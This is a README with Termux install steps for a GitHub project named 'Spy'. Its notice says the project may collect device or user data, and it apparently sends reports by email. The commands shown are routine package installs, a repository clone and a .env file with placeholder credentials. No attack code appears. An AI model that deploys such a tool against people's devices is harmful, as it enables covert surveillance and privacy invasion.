# Project — Installation & Termux Quick-Start

> ⚠️ **Ethical & Legal Notice**  
> This project may include functionality that can collect device or user data. **Do not** use it to invade privacy, access devices you do not own, or perform any unauthorized testing. Use only for learning, authorized security testing, or on systems you own. The author and contributors are **not** responsible for misuse.

---

## Libraries / Tools used (Python)
The project depends on these Python packages:

- `Flask` — web framework  
- `python-docx` — create/write .docx reports  
- `requests` — HTTP requests (e.g., API calls)  
- `python-dotenv` — load environment variables from `.env`  
- `Pillow` — image handling (dependency for python-docx)

---

## Market links (Termux)
Install Termux from one of these official sources:

- Google Play (may be outdated depending on region):  
  `https://play.google.com/store/apps/details?id=com.termux`

- F-Droid (recommended for latest Termux builds):  
  `https://f-droid.org/en/packages/com.termux/`

(Click the link above or paste into your browser to open the store page.)

---

## Termux — copy & paste installation (safe / development)
Open Termux and paste the following commands. These prepare the environment, clone the repository, and install the Python packages inside a virtual environment.

```bash

pkg update -y && pkg upgrade -y
pkg install -y python git clang make openssl-tool libjpeg-turbo zlib
python -m pip install --upgrade pip setuptools wheel
python -m pip install virtualenv
git clone https://github.com/Juttstodio/Spy.git
cd Spy
python -m virtualenv venv
source venv/bin/activate
pip install Flask python-docx requests python-dotenv pillow


cat > .env <<'EOF'
ADMIN_USER=your_admin_username
ADMIN_PASS=your_admin_password
EMAIL_HOST=smtp.example.com
EMAIL_USER=you@example.com
EMAIL_PASS=supersecretpassword
EOF

# 8) Add .env to .gitignore (if not already)
echo ".env" >> .gitignore
